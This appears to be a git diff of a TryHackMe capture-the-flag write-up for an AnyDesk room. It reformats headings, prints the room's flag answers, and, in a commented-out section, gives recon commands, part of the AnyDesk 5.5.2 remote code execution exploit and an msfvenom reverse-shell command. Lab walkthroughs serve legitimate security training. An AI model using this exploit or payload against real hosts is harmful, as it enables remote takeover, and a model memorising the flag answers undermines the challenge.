@@ -6,36 +6,36 @@
 
 <div align="center"> <img alt="Difficulty: Medium" src="https://img.shields.io/badge/Difficulty-Medium-yellow" /> <img alt="OS: Linux" src="https://img.shields.io/badge/OS-Linux-blue" /> </div>
 
-## Task 1. Recon - Research - Exploit
+### Task 1. Recon - Research - Exploit
 
 Do your usual recon, go for some vulnerability research, and exploit this box already.
 Also, don't forget the PrivEsc of course :)
 
 Good luck & have fun!
 
-## What is user.txt?
+### What is user.txt?
 ```
 THM{N0t_ ju5t_ANY_D3sk}
 ```
 
-## What is root.txt?
+### What is root.txt?
 ```
 THM{0nly_ th3m_5.5.2_D3sk}
 ```
 <!--
-# Let start with Scanning the target:
+## Let start with Scanning the target:
 ```
 nmap -sC -sV
 ```
-## SSL Enumeration
+### SSL Enumeration
 ```
 openssl s_client -connect 10.10.10.10:7070
 ```
-## Anydesk is Running on port 7070, let serch for any Exploit
+### Anydesk is Running on port 7070, let serch for any Exploit
 ```
 searchsploit anydesk
 ```
-## Here is the Exploit:
+### Here is the Exploit:
 ```
 # Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
 # Date: 09/06/20
@@ -89,7 +89,7 @@ s.close()
 print('reverse shell should connect within 5 seconds')
 ```
 
-## Creating shell code 
+### Creating shell code 
 ```
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
 ```
